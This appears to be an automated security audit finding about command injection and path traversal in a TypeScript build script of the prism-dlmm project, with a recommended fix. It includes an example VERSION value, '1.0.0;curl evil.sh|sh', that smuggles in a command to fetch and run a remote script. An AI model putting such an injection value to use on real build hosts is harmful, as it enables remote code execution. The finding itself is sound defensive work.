# [MEDIUM] Command injection and arbitrary file write via unvalidated VERSION env var in execSync shell commands

**File:** [`scripts/build-bundle.ts`](https://github.com/irfndi/prism-liquidity-agent/blob/fix/pr-review-remediation/blob/fix/scripts/build-bundle.ts#L38-L72) (lines 38, 67, 70, 72)
**Project:** prism-dlmm
**Severity:** MEDIUM  •  **Confidence:** low  •  **Slug:** `rce`

## Owners

**Suggested assignee:** `join.mantap@gmail.com` _(via last-committer)_

## Finding

build-bundle.ts takes VERSION from the environment (line 38: `const version = process.env.VERSION ?? pkg.version`) and interpolates it into shell commands executed via execSync, and into file paths. Line 70: `execSync("tar -czf ${tarballName} -C ${stageDir} dist lib")` where `tarballName = "prism-v${version}-${platformKey}.tar.gz"` (line 67). A VERSION containing shell metacharacters (e.g. `1.0.0;curl evil.sh|sh`) yields command execution on the build host; GNU tar's `--checkpoint-action=exec=...` also makes this reachable with option-style args. A VERSION containing `/` or `..` lets the tarball (line 70) and checksum write (line 72, `${tarballPath}.sha256`) escape the repo root into arbitrary paths. The script performs no validation of VERSION. In the current CI (release.yml/ci.yml) VERSION is derived from the git tag string-compared against package.json, or from `semver.inc` + timestamp, so exploitation currently requires repo write access or a compromised CI environment — but the safety lives entirely in the pipeline, not in this script, which is also runnable directly by developers. Line 42 additionally interpolates platform/arch into a shell string (lower risk — runtime constants).

## Recommendation

Validate VERSION against a strict pattern (e.g. /^[0-9A-Za-z._-]+$/) at the top of the script and exit non-zero on failure; use execFileSync with an argument array instead of execSync with a shell string for the tar invocation; derive the sha256 output path via path.join on a validated basename.

## Recent committers (`git log`)

- irfndi <join.mantap@gmail.com> (2026-08-03)
